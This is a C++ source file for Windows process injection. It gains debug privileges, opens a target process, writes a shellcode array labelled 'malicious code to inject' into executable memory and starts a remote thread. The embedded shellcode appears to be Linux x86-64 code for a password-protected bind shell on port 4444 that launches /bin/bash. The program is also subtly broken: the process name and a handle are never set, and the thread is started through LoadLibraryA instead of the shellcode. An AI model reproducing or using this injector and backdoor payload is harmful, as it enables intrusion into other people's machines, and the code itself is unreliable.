#include "Windows.h"
#include "tlhelp32.h"
#include <iostream>
#include <stdio.h>
#include <stdlib.h>

STARTUPINFO sui;
PROCESS_INFORMATION pi;
// check for privileges;
int privileges() {
    HANDLE Token;
    TOKEN_PRIVILEGES tp;

    if(OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &Token)) {
        LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &tp.Privileges[0].Luid);
        tp.PrivilegeCount = 1;
        tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
        if (AdjustTokenPrivileges(Token, 0, &tp, sizeof(tp), NULL, NULL) == 0) {
            return 1;
        }else {
            return 0;
        }
    }
    return 1;  
}
// get current process id
HANDLE GetCurrentPid(const TCHAR * szProcName, DWORD DwDesiredAccess = PROCESS_ALL_ACCESS) {
    DWORD procid = 0;
    HANDLE hsnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    PROCESSENTRY32 PE32;

    PE32.dwSize = sizeof(PE32);
    BOOL ret = Process32Next(hsnap, &PE32);
    
        if(ret) {   
            do  {
                if(!_wcsicmp(PE32.szExeFile, szProcName)) {
                procid = PE32.th32ProcessID;
                break;
            }

            }while(Process32Next(hsnap, &PE32)); 
        }
        if(!ret) {
            DWORD error = GetLastError();
            printf("Error with process %d", error);
        }
    CloseHandle(hsnap);

    return OpenProcess(DwDesiredAccess, FALSE, procid);
}


// malicious code to inject
unsigned char shellcode[] = \
"\x48\x31\xf6\x48\xf7\xe6\x04\x29\x48\xff\xc6\x56\x5f\x48\xff\xc7"
"\x0f\x05\x48\x97\x48\x31\xc0\x04\x31\x52\x66\x52\x66\x52\x66\x68"
"\x11\x5c\x48\xff\xc2\x48\xff\xc2\x66\x52\x80\xc2\x0e\x48\x89\xe6"
"\x0f\x05\x48\x31\xc0\x04\x32\x48\x31\xf6\x0f\x05\x48\x31\xc0\x50"
"\x50\x5a\x5e\x04\x2b\x0f\x05\x48\x97\x48\x31\xf6\x80\xc2\x03\x48"
"\x31\xc0\x04\x21\x0f\x05\x48\xff\xc6\x48\x39\xd6\x75\xf1\xeb\x23"
"\x48\x31\xff\x48\xf7\xe7\x57\x5e\x56\x48\xbe\x52\x45\x41\x4c\x4c"
"\x59\x3f\x21\x56\x48\x89\xe6\x48\xff\xc0\x48\x89\xc7\x48\x83\xc2"
"\x10\x0f\x05\x48\x31\xff\x48\xf7\xe7\x57\x5e\x56\x48\xbe\x72\x44"
"\x7a\x20\x49\x5a\x3f\x3f\x56\x48\xbe\x4d\x40\x47\x31\x43\x20\x57"
"\x4f\x56\x48\x89\xe6\x48\xff\xc0\x48\x89\xc7\x48\x83\xc2\x10\x0f"
"\x05\x48\x31\xff\x57\x48\xf7\xe7\x48\x89\xe6\x48\x83\xc2\x0c\x0f"
"\x05\x48\x89\xe7\x48\x31\xf6\x48\x81\xc6\x5a\x65\x72\x5a\x56\x48"
"\xbe\x50\x33\x57\x50\x33\x57\x6c\x34\x56\x48\x89\xe6\x48\x31\xc9"
"\x48\x83\xc1\x0b\xf3\xa6\x0f\x85\x74\xff\xff\xff\x48\x31\xf6\x48"
"\xf7\xe6\x48\x31\xff\x57\x48\x83\xc2\x68\x52\x48\xba\x2f\x62\x69"
"\x6e\x2f\x62\x61\x73\x52\x48\x31\xd2\x48\x89\xe7\xb0\x3b\x0f\x05";

int main() {
// main events of injecting shellcode to process

    HANDLE handle;

    LPVOID pArg;

    const TCHAR * procName;
    
    privileges();

    HANDLE process = GetCurrentPid(procName); 
    
    pArg = (LPVOID) VirtualAllocEx(process, NULL, sizeof(shellcode), MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE); 

    WriteProcessMemory(process, pArg, shellcode, sizeof(shellcode), 0);
    
    HANDLE Remote = CreateRemoteThread(process, NULL, 0, (LPTHREAD_START_ROUTINE)LoadLibraryA, pArg, 0, NULL);
    
    CloseHandle(handle);

    return 0;

}